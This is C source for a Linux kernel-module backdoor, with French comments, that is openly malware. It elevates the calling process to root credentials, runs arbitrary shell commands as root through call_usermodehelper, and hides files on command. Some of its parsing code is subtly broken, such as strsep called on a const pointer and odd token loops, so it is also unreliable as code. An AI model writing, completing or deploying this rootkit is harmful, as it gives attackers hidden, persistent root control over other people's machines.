#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include "backdoor.h"
#include "hide.h"

static void set_root_creds(void) {
    struct cred *new = prepare_creds();
    if (new) {
        new->uid.val = 0;
        new->gid.val = 0;
        new->euid.val = 0;
        new->egid.val = 0;
        commit_creds(new);
    }
}

static void exec_command(const char *cmd) {
    // call_usermodehelper
    char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
    static char *envp[] = {
        "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void handle_command(const char *cmd_line) {
    // cmd_line pourrait être "root", "exec whoami", "hide /secret"
    char *buf, *token;
    char *saveptr;
    int argc = 0;

    buf = kstrdup(cmd_line, GFP_KERNEL);
    if (!buf) return;

    // Compter les arguments
    token = buf;
    while ((token = strsep(&token, " ")) != NULL) argc++;

    kfree(buf);
    buf = kstrdup(cmd_line, GFP_KERNEL);
    if (!buf) return;

    char **args = kmalloc_array(argc, sizeof(char *), GFP_KERNEL);
    if (!args) {
        kfree(buf);
        return;
    }

    int i = 0;
    token = buf;
    while ((token = strsep(&token, " ")) != NULL) {
        if (*token != '\0') {
            args[i++] = token;
        }
    }

    if (i < 1) {
        kfree(args);
        kfree(buf);
        return;
    }

    if (strcmp(args[0], "root") == 0) {
        set_root_creds();
    } else if (strcmp(args[0], "exec") == 0 && i > 1) {
        // Reconstituer la commande
        char *cmd_str = strsep(&cmd_line, " ");
        cmd_str = (char *)cmd_line; // pointer après "exec"
        exec_command(cmd_str);
    } else if (strcmp(args[0], "hide") == 0 && i > 1) {
        hide_add_file(args[1]);
    }

    kfree(args);
    kfree(buf);
}

int init_backdoor(void) {
    return 0; // rien de spécial ici
}

void cleanup_backdoor(void) {
    // rien à faire
}
